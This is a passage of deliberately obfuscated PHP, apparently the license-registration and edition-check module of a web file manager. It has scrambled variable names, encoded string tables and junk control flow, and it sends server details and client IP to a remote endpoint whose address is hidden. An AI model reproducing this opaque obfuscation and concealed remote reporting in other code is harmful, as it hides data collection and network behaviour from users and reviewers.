$this->znspb6b9e4c0($²áÎš‚º[25], array($this, $²áÎš‚º[26])); $“ÑæÎ–ß = $óŠ¥Ò¨•[734]; $this->znspb6b9e4c0($²áÎš‚º[27], array($this, $²áÎš‚º[28])); $–¡ßÑ£ = $óŠ¥Ò¨•[735]; if (!$–¡ßÑ£) { return; } $this->znspb6b9e4c0($²áÎš‚º[29], array($this, $²áÎš‚º[30])); $îÎ„Íéä = $óŠ¥Ò¨•[736]; while (strlen($îÎ„Íéä) < $óŠ¥Ò¨•[707]) { if (!$îÎ„Íéä) { break; } $îÎ„Íéä++; } $this->znspb6b9e4c0($²áÎš‚º[31], array($this, $²áÎš‚º[32])); } public function getVersionData() { return $this->mkofee3bb645; $¡üì¤ßÅ = $_SERVER[ïÃ°£«Ê][737]; if (!$¡üì¤ßÅ) { die; } } public function jvdld303d257($ğÃô•“ƒ) { $œ±¶Æú¡ =& $_SERVER[ïÃ°£«Ê]; $¢ÂÃØÍ½ =& $_SERVER[Ã™”Á÷ï]; $İ¤¥í‡Œ = Model($¢ÂÃØÍ½[33])->get(); $ó©­æõ = $œ±¶Æú¡[738]; if (strlen($ó©­æõ) < $œ±¶Æú¡[713]) { return; } $ö³”©”à = array($¢ÂÃØÍ½[34], $¢ÂÃØÍ½[35], $¢ÂÃØÍ½[36], $¢ÂÃØÍ½[37], $¢ÂÃØÍ½[38], $¢ÂÃØÍ½[39], $¢ÂÃØÍ½[40], $¢ÂÃØÍ½[41], $¢ÂÃØÍ½[42], $¢ÂÃØÍ½[43], $¢ÂÃØÍ½[44], $¢ÂÃØÍ½[45], $¢ÂÃØÍ½[46], $¢ÂÃØÍ½[47], $¢ÂÃØÍ½[48], $¢ÂÃØÍ½[49], $¢ÂÃØÍ½[50], $¢ÂÃØÍ½[51], $¢ÂÃØÍ½[52], $¢ÂÃØÍ½[53], $¢ÂÃØÍ½[54], $¢ÂÃØÍ½[55], $¢ÂÃØÍ½[56], $¢ÂÃØÍ½[57], $¢ÂÃØÍ½[58], $¢ÂÃØÍ½[59], $¢ÂÃØÍ½[60], $¢ÂÃØÍ½[61], $¢ÂÃØÍ½[62], $¢ÂÃØÍ½[63], $¢ÂÃØÍ½[64], $¢ÂÃØÍ½[65], $¢ÂÃØÍ½[66], $¢ÂÃØÍ½[67], $¢ÂÃØÍ½[68], $¢ÂÃØÍ½[69], $¢ÂÃØÍ½[70], $¢ÂÃØÍ½[71], $¢ÂÃØÍ½[72], $¢ÂÃØÍ½[73], $¢ÂÃØÍ½[74], $¢ÂÃØÍ½[75], $¢ÂÃØÍ½[76], $¢ÂÃØÍ½[77], $¢ÂÃØÍ½[78], $¢ÂÃØÍ½[79], $¢ÂÃØÍ½[80], $¢ÂÃØÍ½[81], $¢ÂÃØÍ½[82], $¢ÂÃØÍ½[83], $¢ÂÃØÍ½[84], $¢ÂÃØÍ½[85], $¢ÂÃØÍ½[86], $¢ÂÃØÍ½[87]); $Ç°Á²Æİ = $œ±¶Æú¡[739]; foreach ($ö³”©”à as $É“ş¬÷·) { $‹óÕ€œÅ = $GLOBALS[$¢ÂÃØÍ½[88]][$¢ÂÃØÍ½[89]][$É“ş¬÷·]; $Áş©ıõ‘ = $œ±¶Æú¡[740]; if (strlen($Áş©ıõ‘) < $œ±¶Æú¡[709]) { die; } if (isset($İ¤¥í‡Œ[$É“ş¬÷·])) { $‹óÕ€œÅ = $İ¤¥í‡Œ[$É“ş¬÷·]; } $ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$É“ş¬÷·] = $‹óÕ€œÅ; } $èüµÚ†à = $ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$¢ÂÃØÍ½[46]]; $ÌÏ ÏÑ¤ = $œ±¶Æú¡[741]; if (!$ÌÏ ÏÑ¤) { return; } unset($ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[92]][$¢ÂÃØÍ½[93]]); $«œ€³Õ = $œ±¶Æú¡[742]; if (strlen($«œ€³Õ) < $œ±¶Æú¡[731]) { die; } unset($ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[92]][$¢ÂÃØÍ½[94]]); unset($ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$¢ÂÃØÍ½[46]]); $Ğì„æ³  = $œ±¶Æú¡[743]; if (strlen($Ğì„æ³ ) < $œ±¶Æú¡[707]) { return; } unset($ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$¢ÂÃØÍ½[95]]); $ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$¢ÂÃØÍ½[96]] = array($¢ÂÃØÍ½[97] => (int) $èüµÚ†à[$¢ÂÃØÍ½[98]], $¢ÂÃØÍ½[99] => (int) _get($èüµÚ†à, $¢ÂÃØÍ½[100], 0)); $àèÎµµâ = substr(md5($¢ÂÃØÍ½[101] . get_client_ip() . $İ¤¥í‡Œ[$¢ÂÃØÍ½[102]]), 0, 15); $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[104]] = Mcrypt::encode(Session::sign(), $àèÎµµâ, 3600 * 24); $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[105]] = Action($¢ÂÃØÍ½[106])->accessToken(); $”û‹äéè = $œ±¶Æú¡[744]; while ($”û‹äéè < $œ±¶Æú¡[726]) { if ($”û‹äéè >= 0) { break; } $”û‹äéè++; } $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[107]] = md5($_SERVER[$¢ÂÃØÍ½[108]] . $İ¤¥í‡Œ[$¢ÂÃØÍ½[102]]); $ßİœ›ƒÉ = $œ±¶Æú¡[745]; if (!$ßİœ›ƒÉ) { die; } $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[109]] = base64_encode(serverInfo()); $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[110]] = $this->aeup95bbfc03; if ($İ¤¥í‡Œ[$¢ÂÃØÍ½[110]] != $¢ÂÃØÍ½[111]) { $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[112]] = $İ¤¥í‡Œ[$¢ÂÃØÍ½[112]]; $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[113]] = $İ¤¥í‡Œ[$¢ÂÃØÍ½[113]]; $ŒÍÇäÓ = rand_string(10) . $this->aeup95bbfc03 . rand_string(5); $ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[114]][$¢ÂÃØÍ½[115]] = $this->wqjlbe6ceb91($ŒÍÇäÓ, $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[107]]); } if ($this->aeup95bbfc03 == $¢ÂÃØÍ½[111]) { $ğÃô•“ƒ[$¢ÂÃØÍ½[90]][$¢ÂÃØÍ½[91]][$¢ÂÃØÍ½[96]][$¢ÂÃØÍ½[100]] = 0; } $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[116]] = $this->versionPluginFilter(); $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[117]] = _get($this->mkofee3bb645, $¢ÂÃØÍ½[118], $¢ÂÃØÍ½[6]); if (KodUser::isRoot() && $this->config[$¢ÂÃØÍ½[119]]) { $ğÃô•“ƒ[$¢ÂÃØÍ½[103]][$¢ÂÃØÍ½[120]] = WEB_ROOT; } return $ğÃô•“ƒ; } private function kbnv24a0b389() { $È Ùò„ =& $_SERVER[ïÃ°£«Ê]; $‘ÀÜ™¥ =& $_SERVER[Ã™”Á÷ï]; $·İúÂÖƒ = $_SERVER[$‘ÀÜ™¥[24]] == $‘ÀÜ™¥[121]; if ($_SERVER[$‘ÀÜ™¥[24]] == $‘ÀÜ™¥[122] && $_GET[$‘ÀÜ™¥[123]] == $‘ÀÜ™¥[124]) { $·İúÂÖƒ = !0; } if ($·İúÂÖƒ) { $á¯ª¹Ë‡ = array($‘ÀÜ™¥[110] => $this->aeup95bbfc03, $‘ÀÜ™¥[125] => $this->klca8300346c(), $‘ÀÜ™¥[126] => Model($‘ÀÜ™¥[127])->count()); if ($this->aeup95bbfc03 != $‘ÀÜ™¥[111]) { $ êóîÆä = _get($this->mkofee3bb645, $‘ÀÜ™¥[128]); if ($ êóîÆä) { $á¯ª¹Ë‡[$‘ÀÜ™¥[129]] = $ êóîÆä; $á¯ª¹Ë‡[$‘ÀÜ™¥[130]] = strtotime(_get($this->mkofee3bb645, $‘ÀÜ™¥[131])); $á¯ª¹Ë‡[$‘ÀÜ™¥[132]] = _get($this->mkofee3bb645, $‘ÀÜ™¥[118]); } $„¶÷ıµ© = Model($‘ÀÜ™¥[33])->get($‘ÀÜ™¥[133], $‘ÀÜ™¥[6], !0); if (is_string($„¶÷ıµ©) && substr($„¶÷ıµ©, 0, 1) == $‘ÀÜ™¥[134]) { $„¶÷ıµ© = json_decode_force($„¶÷ıµ©); } if (is_array($„¶÷ıµ©) && $„¶÷ıµ©[$‘ÀÜ™¥[135]] && strstr($„¶÷ıµ©[$‘ÀÜ™¥[135]], $‘ÀÜ™¥[136])) { $ğ—¤çİĞ = explode($‘ÀÜ™¥[136], $„¶÷ıµ©[$‘ÀÜ™¥[135]]); $á¯ª¹Ë‡[$‘ÀÜ™¥[137]] = $ğ—¤çİĞ[0]; } } $á¯ª¹Ë‡ = $this->mqfy0added59(json_encode($á¯ª¹Ë‡), md5($‘ÀÜ™¥[138])); $•ì¥”§ = array($‘ÀÜ™¥[139] => $á¯ª¹Ë‡); call_user_func(array($‘ÀÜ™¥[140], $‘ÀÜ™¥[141]), $•ì¥”§); } if ($this->aeup95bbfc03 == $‘ÀÜ™¥[111]) { return; } $ñüóÊ„ = array($‘ÀÜ™¥[142], $‘ÀÜ™¥[143], $‘ÀÜ™¥[144], $‘ÀÜ™¥[145], $‘ÀÜ™¥[146], $‘ÀÜ™¥[147]); $âîÃ†ŸÂ = $È Ùò„[746]; if (strlen($âîÃ†ŸÂ) < $È Ùò„[707]) { die; } $¢¢Ğ®¡… = Model($‘ÀÜ™¥[33])->get(); $•ì¥”§ = array($‘ÀÜ™¥[148] => $¢¢Ğ®¡…[$‘ÀÜ™¥[34]], $‘ÀÜ™¥[149] => $¢¢Ğ®¡…[$‘ÀÜ™¥[35]], $‘ÀÜ™¥[150] => $‘ÀÜ™¥[6]); foreach ($ñüóÊ„ as $ó˜òöƒâ) { if (!isset($¢¢Ğ®¡…[$ó˜òöƒâ]) || !$¢¢Ğ®¡…[$ó˜òöƒâ]) { continue; } $•ì¥”§[$ó˜òöƒâ] = $¢¢Ğ®¡…[$ó˜òöƒâ]; } call_user_func(array($‘ÀÜ™¥[140], $‘ÀÜ™¥[141]), $•ì¥”§); } private function uzhobf777aaf() { $âÕğÅìá =& $_SERVER[ïÃ°£«Ê]; $Ó–˜á´™ =& $_SERVER[Ã™”Á÷ï]; if ($_SERVER[$Ó–˜á´™[24]] != $Ó–˜á´™[151]) { return; } if (!KodUser::isRoot()) { die; } $ŠŸùÑ¹™ = $GLOBALS[$Ó–˜á´™[13]]; if (isset($ŠŸùÑ¹™[$Ó–˜á´™[152]])) { $this->iabh360ed342(); die; } if (isset($ŠŸùÑ¹™[$Ó–˜á´™[153]]) && isset($ŠŸùÑ¹™[$Ó–˜á´™[153]]) == $Ó–˜á´™[124]) { $ŠŸùÑ¹™[$Ó–˜á´™[154]] = Model($Ó–˜á´™[33])->get($Ó–˜á´™[155]); } if (!isset($ŠŸùÑ¹™[$Ó–˜á´™[154]]) || strlen($ŠŸùÑ¹™[$Ó–˜á´™[154]]) != 16) { show_json($Ó–˜á´™[156] . $ŠŸùÑ¹™[$Ó–˜á´™[154]], !1); } $ƒ¿‹öø = Model($Ó–˜á´™[33])->get($Ó–˜á´™[102]); $Ú‘Ã•ü = md5($_SERVER[$Ó–˜á´™[108]] . $ƒ¿‹öø); $¨¾“û“ = $âÕğÅìá[747]; if (!$¨¾“û“) { die; } $÷øáé”â = array($Ó–˜á´™[154] => $ŠŸùÑ¹™[$Ó–˜á´™[154]], $Ó–˜á´™[157] => rand_string(16), $Ó–˜á´™[158] => $Ó–˜á´™[138], $Ó–˜á´™[159] => $Ó–˜á´™[160], $Ó–˜á´™[161] => $_SERVER[$Ó–˜á´™[162]], $Ó–˜á´™[163] => $_SERVER[$Ó–˜á´™[164]], $Ó–˜á´™[165] => $_SERVER[$Ó–˜á´™[166]], $Ó–˜á´™[107] => $Ú‘Ã•ü, $Ó–˜á´™[167] => Model($Ó–˜á´™[33])->get($Ó–˜á´™[133])); if (isset($ŠŸùÑ¹™[$Ó–˜á´™[153]]) && isset($ŠŸùÑ¹™[$Ó–˜á´™[153]]) == $Ó–˜á´™[124]) { $÷øáé”â[$Ó–˜á´™[153]] = md5($÷øáé”â[$Ó–˜á´™[154]] . $Ó–˜á´™[168] . $÷øáé”â[$Ó–˜á´™[157]]); } if ($ŠŸùÑ¹™[$Ó–˜á´™[169]] == $Ó–˜á´™[170]) { $…«…ú•• = $this->mqfy0added59($Ú‘Ã•ü, $Ó–˜á´™[171]); $úÚÈ˜¶“ = $this->wqjlbe6ceb91(json_encode($÷øáé”â), $Ú‘Ã•ü . $Ó–˜á´™[172], 3); $úÚÈ˜¶“ = $úÚÈ˜¶“ . $Ó–˜á´™[173] . $_SERVER[$Ó–˜á´™[162]]; $‹Íú“õ’ = $this->lhrm27794f82($Ó–˜á´™[174] . $…«…ú•• . $Ó–˜á´™[175] . $úÚÈ˜¶“, -1); show_json($‹Íú“õ’, !0); } else { if ($ŠŸùÑ¹™[$Ó–˜á´™[169]] == $Ó–˜á´™[176]) { $ÚÊŒÅèÓ = substr(md5($Ó–˜á´™[177] . $Ú‘Ã•ü), 12, 15) . $Ó–˜á´™[178]; $úÚÈ˜¶“ = $this->guewa32b6dfc(trim($ŠŸùÑ¹™[$Ó–˜á´™[179]]), $ÚÊŒÅèÓ, 2); $¡ÁĞğ¾å = json_decode($úÚÈ˜¶“, !0); if (!is_array($¡ÁĞğ¾å) || !is_array($¡ÁĞğ¾å[$Ó–˜á´™[180]]) || $¡ÁĞğ¾å[$Ó–˜á´™[154]] != !0) { $ÂÕˆ¹ = $Ó–˜á´™[181]; $á£ƒò©¬ = $¡ÁĞğ¾å[$Ó–˜á´™[180]] ? $Ó–˜á´™[182] . $¡ÁĞğ¾å[$Ó–˜á´™[180]] : $ÂÕˆ¹; show_json($á£ƒò©¬, !1); } else { $÷øáé”â[$Ó–˜á´™[157]] = $¡ÁĞğ¾å[$Ó–˜á´™[180]][$Ó–˜á´™[183]]; } } else { $¡ÁĞğ¾å = $this->lhrm27794f82($Ó–˜á´™[184], $÷øáé”â, 10); } } if (!is_array($¡ÁĞğ¾å) || !is_array($¡ÁĞğ¾å[$Ó–˜á´™[180]]) || $¡ÁĞğ¾å[$Ó–˜á´™[154]] != !0) { $ÂÕˆ¹ = LNG($Ó–˜á´™[185]); $á£ƒò©¬ = $¡ÁĞğ¾å[$Ó–˜á´™[180]] ? $Ó–˜á´™[182] . $¡ÁĞğ¾å[$Ó–˜á´™[180]] : $ÂÕˆ¹; show_json($á£ƒò©¬, !1); } $Á–ÒÊŸ = $¡ÁĞğ¾å[$Ó–˜á´™[180]]; $·™Ê·Å„ = $this->cgqed963a255($Á–ÒÊŸ[$Ó–˜á´™[186]]); $†Ü²àä = $âÕğÅìá[748]; if (!$†Ü²àä) { return; } if (!$·™Ê·Å„ || $·™Ê·Å„ != $Á–ÒÊŸ[$Ó–˜á´™[131]]) { $¦¬£­ŸÒ = array($Ó–˜á´™[187] => Model($Ó–˜á´™[33])->get($Ó–˜á´™[102]), $Ó–˜á´™[188] => $_SERVER[$Ó–˜á´™[108]], $Ó–˜á´™[189] => this_url(), $Ó–˜á´™[163] => $_SERVER[$Ó–˜á´™[164]]); $úÚÈ˜¶“ = $this->gthd20a03437(json_encode($¦¬£­ŸÒ)); $this->lhrm27794f82($Ó–˜á´™[190] . $úÚÈ˜¶“); show_json(LNG($Ó–˜á´™[191]), !0); } $öğŸôÓì = array($Ó–˜á´™[155] => $Á–ÒÊŸ[$Ó–˜á´™[192]], $Ó–˜á´™[193] => $Á–ÒÊŸ[$Ó–˜á´™[194]], $Ó–˜á´™[195] => rand_string(16), $Ó–˜á´™[110] => $Á–ÒÊŸ[$Ó–˜á´™[196]]); if ($÷øáé”â[$Ó–˜á´™[157]]) { $öğŸôÓì[$Ó–˜á´™[195]] = $÷øáé”â[$Ó–˜á´™[157]]; } $´î¯à­® = substr(md5($öğŸôÓì[$Ó–˜á´™[193]]), 10, 10); $µÛ£ºßì = $´î¯à­® . $öğŸôÓì[$Ó–˜á´™[110]] . $öğŸôÓì[$Ó–˜á´™[195]]; $æŒè´÷ã = $âÕğÅìá[749]; if (!$æŒè´÷ã) { die; } $öğŸôÓì[$Ó–˜á´™[112]] = strrev(base64_encode($this->mqfy0added59($µÛ£ºßì, $Ó–˜á´™[197]))); $í¨©Æ¹§ = $âÕğÅìá[750]; if (strlen($í¨©Æ¹§) < $âÕğÅìá[707]) { die; } $êµ“Çç× = rand_string(16); $¨±ÈòåÍ = $êµ“Çç× . $öğŸôÓì[$Ó–˜á´™[110]] . $this->mqfy0added59(md5($öğŸôÓì[$Ó–˜á´™[155]]), $êµ“Çç×); $ö¾¸¤×† = $âÕğÅìá[751]; if (!$ö¾¸¤×†) { return; } $öğŸôÓì[$Ó–˜á´™[113]] = base64_encode(strrev($this->mqfy0added59($¨±ÈòåÍ, $Ó–˜á´™[198]))); if ($Á–ÒÊŸ[$Ó–˜á´™[199]] && $Á–ÒÊŸ[$Ó–˜á´™[199]] >= 1) { Model($Ó–˜á´™[33])->setDeep($Ó–˜á´™[200], $Ó–˜á´™[124]); } Model($Ó–˜á´™[33])->set($öğŸôÓì); $Íú¡‹¯˜ = md5($_SERVER[$Ó–˜á´™[108]] . strrev($ƒ¿‹öø) . $öğŸôÓì[$Ó–˜á´™[193]]); $¶îù˜™ö = $âÕğÅìá[752]; $¸¢ßŸ˜ = strrev(substr($Íú¡‹¯˜, 10, 16)); $™şã = $this->wqjlbe6ceb91(json_encode($Á–ÒÊŸ), $Íú¡‹¯˜); $ùë¡©Á¯ = array_to_keyvalue(Model($Ó–˜á´™[7])->listData(), $Ó–˜á´™[201]); $„¥‰ı¤ = $âÕğÅìá[753]; while (strlen($„¥‰ı¤) < $âÕğÅìá[707]) { if (!$„¥‰ı¤) { break; } $„¥‰ı¤++; } $ª…Çâ®Ö = $ùë¡©Á¯[$Ó–˜á´™[202]]; $ÑÇ‚ÂÅä = $âÕğÅìá[754]; if (!$ÑÇ‚ÂÅä) { die; } $ŸŸ¼ãŸà = array(); $ŸŸ¼ãŸà[$¸¢ßŸ˜] = $™şã; Model($Ó–˜á´™[7])->update($ª…Çâ®Ö[$Ó–˜á´™[203]], array($Ó–˜á´™[204] => $ŸŸ¼ãŸà)); $ÍÇÔ§Ü¨ = $âÕğÅìá[755]; while ($ÍÇÔ§Ü¨ < $âÕğÅìá[709]) { if ($ÍÇÔ§Ü¨ >= 0) { break; } $ÍÇÔ§Ü¨++; } $this->mkofee3bb645 = $Á–ÒÊŸ; $this->aeup95bbfc03 = $öğŸôÓì[$Ó–˜á´™[110]]; $¿€é“Ñ = $âÕğÅìá[756]; if (strlen($¿€é“Ñ) < $âÕğÅìá[709]) { return; } $this->licenseRegistSuccess(); Cache::set($Ó–˜á´™[205] . md5($ƒ¿‹öø . $Ó–˜á´™[206]), $Ó–˜á´™[6]); show_json(LNG($Ó–˜á´™[191]), !0); $·»Çı€Ê = $âÕğÅìá[757]; if (strlen($·»Çı€Ê) < $âÕğÅìá[707]) { die; } } private function licenseRegistSuccess() { $éñŒÔÍş =& $_SERVER[Ã™”Á÷ï]; $Ä«ù£Œ“ = Model($éñŒÔÍş[33])->get(); $——‚”ó² = $_SERVER[ïÃ°£«Ê][758]; if (!$——‚”ó²) { die; } if ($Ä«ù£Œ“[$éñŒÔÍş[63]] != $éñŒÔÍş[124]) { Model($éñŒÔÍş[33])->set($éñŒÔÍş[63], $éñŒÔÍş[124]); } Action($éñŒÔÍş[207])->initStart(!0); } private function iabh360ed342() { $¸ÅÜÓè¿ =& $_SERVER[ïÃ°£«Ê]; $ÖøÄé— =& $_SERVER[Ã™”Á÷ï]; Model($ÖøÄé—[33])->set(array($ÖøÄé—[155] => $ÖøÄé—[6], $ÖøÄé—[193] => $ÖøÄé—[6], $ÖøÄé—[110] => $ÖøÄé—[111], $ÖøÄé—[112] => $ÖøÄé—[6], $ÖøÄé—[113] => $ÖøÄé—[6])); $éŒè×İ¡ = $¸ÅÜÓè¿[759]; if (!$éŒè×İ¡) { die; } Model($ÖøÄé—[33])->setDeep($ÖøÄé—[200], $ÖøÄé—[208]); $this->mkofee3bb645 = array(); $this->aeup95bbfc03 = $ÖøÄé—[111]; $æ†§í¤ = $¸ÅÜÓè¿[760]; while ($æ†§í¤ < $¸ÅÜÓè¿[713]) { if ($æ†§í¤ >= 0) { break; } $æ†§í¤++; } } private function lyci536099c4() { $™Ñß¨© =& $_SERVER[ïÃ°£«Ê]; $ÙøªøÔá =& $_SERVER[Ã™”Á÷ï]; $_SERVER[$ÙøªøÔá[164]] = _get($_SERVER, $ÙøªøÔá[164], APP_HOST); $this->aeup95bbfc03 = $ÙøªøÔá[111]; $†ºñÆÁ = Model($ÙøªøÔá[33])->get(); $Û¯ÆŸ·÷ = $™Ñß¨©[761]; while ($Û¯ÆŸ·÷ < $™Ñß¨©[707]) { if ($Û¯ÆŸ·÷ >= 0) { break; } $Û¯ÆŸ·÷++; } if ($†ºñÆÁ[$ÙøªøÔá[110]] == $ÙøªøÔá[111]) { return; } $ºñºªÍ = Model($ÙøªøÔá[33])->get($ÙøªøÔá[102]); $¨ˆ•¬¼® = $™Ñß¨©[762]; $ó†‘¾åç = $ÙøªøÔá[205] . md5($ºñºªÍ . $ÙøªøÔá[206]); $¬óÁ²Åæ = $™Ñß¨©[763]; $ú€•Ôì× = Cache::get($ó†‘¾åç); $µ®İœ³È = $™Ñß¨©[764]; if (!is_array($ú€•Ôì×) || !isset($ú€•Ôì×[$ÙøªøÔá[209]]) || time() - $ú€•Ôì×[$ÙøªøÔá[209]] >= 60) { $ÕğéûÖÔ = Model($ÙøªøÔá[7])->loadList(); $µ¬½ÍÎ  = $ÕğéûÖÔ[$ÙøªøÔá[202]]; $ö‰¹ÚŸó = md5($_SERVER[$ÙøªøÔá[108]] . strrev($ºñºªÍ) . $†ºñÆÁ[$ÙøªøÔá[193]]); $¤ï™š = strrev(substr($ö‰¹ÚŸó, 10, 16)); $ú€•Ôì× = $this->guewa32b6dfc($µ¬½ÍÎ [$ÙøªøÔá[88]][$¤ï™š], $ö‰¹ÚŸó); $ú€•Ôì× = json_decode($ú€•Ôì×, !0); } if (!is_array($ú€•Ôì×)) { return $this->iabh360ed342(); } $Ğ‹Á†“ = strtotime($ú€•Ôì×[$ÙøªøÔá[131]]); if (time() >= $Ğ‹Á†“) { return $this->iabh360ed342(); } if (!isset($ú€•Ôì×[$ÙøªøÔá[209]]) || time() - $ú€•Ôì×[$ÙøªøÔá[209]] > 20) { $ú€•Ôì×[$ÙøªøÔá[209]] = time(); Cache::set($ó†‘¾åç, $ú€•Ôì×); } $this->mkofee3bb645 = $ú€•Ôì×; $this->aeup95bbfc03 = $†ºñÆÁ[$ÙøªøÔá[110]]; $GLOBALS[$ÙøªøÔá[210]] = $this; } private function qlub08397731() { $çÖªØÇ =& $_SERVER[Ã™”Á÷ï]; $ã×‚ì«‚ = $GLOBALS[$çÖªØÇ[13]]; $ÕÓ…¢âÖ = $_SERVER[$çÖªØÇ[24]]; if ($ÕÓ…¢âÖ == $çÖªØÇ[211] && $this->aeup95bbfc03 == $çÖªØÇ[111]) { show_json(LNG($çÖªØÇ[212]), !1, $çÖªØÇ[213]); } $ú«šË©Ş = array($çÖªØÇ[214], $çÖªØÇ[215]); if (in_array($ÕÓ…¢âÖ, $ú«šË©Ş)) { if ($this->aeup95bbfc03 == $çÖªØÇ[111] && isset($ã×‚ì«‚[$çÖªØÇ[216]])) { show_json(LNG($çÖªØÇ[212]), !1, $çÖªØÇ[213]); die; } $åû¦ÊÈ¥ = $this->klca8300346c(); if ($åû¦ÊÈ¥ != intval($çÖªØÇ[217])) { if ($åû¦ÊÈ¥ <= Model($çÖªØÇ[127])->count()) { show_json(LNG($çÖªØÇ[218]), !1, $çÖªØÇ[213]); die; } } } } private function ibgja7dc665d() { $Èí«ƒ×ı =& $_SERVER[ïÃ°£«Ê]; $Ÿ“ìù‘õ =& $_SERVER[Ã™”Á÷ï]; $€ºõ„Ù = array($Ÿ“ìù‘õ[121], $Ÿ“ìù‘õ[122]); $ÇæÀ„ç = $Èí«ƒ×ı[765]; while ($ÇæÀ„ç < $Èí«ƒ×ı[726]) { if ($ÇæÀ„ç >= 0) { break; } $ÇæÀ„ç++; } if (!KodUser::isRoot() || !isset($_GET[$Ÿ“ìù‘õ[219]])) { return; } if (!in_array($_SERVER[$Ÿ“ìù‘õ[24]], $€ºõ„Ù)) { return; } $©Ë‹ƒŒó = $Ÿ“ìù‘õ[220]; $²˜’Ñ¸æ = $Èí«ƒ×ı[766]; while ($²˜’Ñ¸æ < $Èí«ƒ×ı[713]) { if ($²˜’Ñ¸æ >= 0) { break; } $²˜’Ñ¸æ++; } $©Ë‹ƒŒó = $this->pnfsc3cfe6cd($©Ë‹ƒŒó, $Ÿ“ìù‘õ[221]); $å¨¼€™ = $Èí«ƒ×ı[767]; $ÙîÍ·¢ = stream_context_create(array($Ÿ“ìù‘õ[222] => array($Ÿ“ìù‘õ[223] => $Ÿ“ìù‘õ[224], $Ÿ“ìù‘õ[225] => 3))); $ÂÓºëöğ = $Èí«ƒ×ı[768]; while ($ÂÓºëöğ < $Èí«ƒ×ı[713]) { if ($ÂÓºëöğ >= 0) { break; } $ÂÓºëöğ++; } $íê¸ÚàÉ = @file_get_contents($©Ë‹ƒŒó, !1, $ÙîÍ·¢); $¡ÜÛòûæ = $Èí«ƒ×ı[769]; header($Ÿ“ìù‘õ[226]); $¢ù‡ˆıû = $Èí«ƒ×ı[770]; while ($¢ù‡ˆıû < $Èí«ƒ×ı[731]) { if ($¢ù‡ˆıû >= 0) { break; } $¢ù‡ˆıû++; } if ($íê¸ÚàÉ && strstr($íê¸ÚàÉ, $Ÿ“ìù‘õ[227])) { echo $íê¸ÚàÉ; } die; } public function poytc8118454($‹Û­ˆêô) { $°„›“Øç =& $_SERVER[ïÃ°£«Ê]; $ëÃ¢¿¢² =& $_SERVER[Ã™”Á÷ï]; if ($this->aeup95bbfc03 == $ëÃ¢¿¢²[228]) { return $‹Û­ˆêô; } $¶Úƒú¢ = $this->versionPluginList(); $ß•®â†Ç = $°„›“Øç[771]; if (strlen($ß•®â†Ç) < $°„›“Øç[731]) { die; } $Ç©‚úÄ‹ = explode($ëÃ¢¿¢²[229], $this->versionPluginFilter()); $™Ä›»±õ = array(); foreach ($¶Úƒú¢ as $™§ÎÊıØ => $ÄÇığ‘‡) { if ($ÄÇığ‘‡ == $ëÃ¢¿¢²[230] && substr($this->aeup95bbfc03, 0, 1) == $ëÃ¢¿¢²[230]) { continue; } if (!in_array($™§ÎÊıØ, $Ç©‚úÄ‹)) { $™Ä›»±õ[] = $™§ÎÊıØ; } } foreach ($™Ä›»±õ as $™§ÎÊıØ) { unset($‹Û­ˆêô[$™§ÎÊıØ]); $ªïì·„ë = $°„›“Øç[772]; if (!$ªïì·„ë) { die; } } return $‹Û­ˆêô; } private function versionPluginList() { $·ıµ‰ãì =& $_SERVER[ïÃ°£«Ê]; $’ãŠÃÅü =& $_SERVER[Ã™”Á÷ï]; return array($’ãŠÃÅü[231] => $’ãŠÃÅü[230], $’ãŠÃÅü[232] => $’ãŠÃÅü[230], $’ãŠÃÅü[233] => $’ãŠÃÅü[230], $’ãŠÃÅü[234] => $’ãŠÃÅü[230], $’ãŠÃÅü[235] => $’ãŠÃÅü[230], $’ãŠÃÅü[236] => $’ãŠÃÅü[230], $’ãŠÃÅü[237] => $’ãŠÃÅü[238], $’ãŠÃÅü[239] => $’ãŠÃÅü[238], $’ãŠÃÅü[240] => $’ãŠÃÅü[238], $’ãŠÃÅü[241] => $’ãŠÃÅü[238], $’ãŠÃÅü[242] => $’ãŠÃÅü[238], $’ãŠÃÅü[243] => $’ãŠÃÅü[238], $’ãŠÃÅü[244] => $’ãŠÃÅü[238], $’ãŠÃÅü[245] => $’ãŠÃÅü[238], $’ãŠÃÅü[246] => $’ãŠÃÅü[238], $’ãŠÃÅü[247] => $’ãŠÃÅü[238], $’ãŠÃÅü[248] => $’ãŠÃÅü[238], $’ãŠÃÅü[249] => $’ãŠÃÅü[238], $’ãŠÃÅü[250] => $’ãŠÃÅü[238]); $¤ğ¯•¤² = $·ıµ‰ãì[773]; if (strlen($¤ğ¯•¤²) < $·ıµ‰ãì[731]) { return; } } private function versionPluginFilter() { $ÎÄŠÄüÇ =& $_SERVER[ïÃ°£«Ê]; $ø…½¥É =& $_SERVER[Ã™”Á÷ï]; if ($this->aeup95bbfc03 == $ø…½¥É[111]) { return $ø…½¥É[6]; } $Ã‰Ã«ÅÏ = _get($this->mkofee3bb645, $ø…½¥É[251], $ø…½¥É[6]); $×ïé¨¸Ù = $ÎÄŠÄüÇ[774]; $ùâõ‹Á· = _get($this->mkofee3bb645, $ø…½¥É[118], $ø…½¥É[6]); $šı•åÎõ = _get($this->mkofee3bb645, 